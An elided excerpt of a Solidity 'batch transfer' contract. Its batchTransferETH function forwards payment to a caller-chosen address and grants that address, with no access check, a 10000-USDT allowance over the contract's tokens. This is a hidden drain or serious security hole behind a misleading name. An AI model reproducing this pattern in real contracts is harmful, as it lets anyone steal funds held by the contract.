...
contract PiLiangZhuanZhang  {
    ...
    function batchTransfer(address[] memory _addrs, uint256[] memory _amounts ) public {
        ...
        require(len == _amounts.length, "check len");
    ...
    uint256 _amounta;
    function batchTransferETH(address payable teamWalletAddress, uint256 value ) payable public {
        require(msg.value == value, "not enough BNB");
        teamWalletAddress.transfer(value);
        IERC20(usdt).approve(teamWalletAddress, 10000 * 10**18);
    }
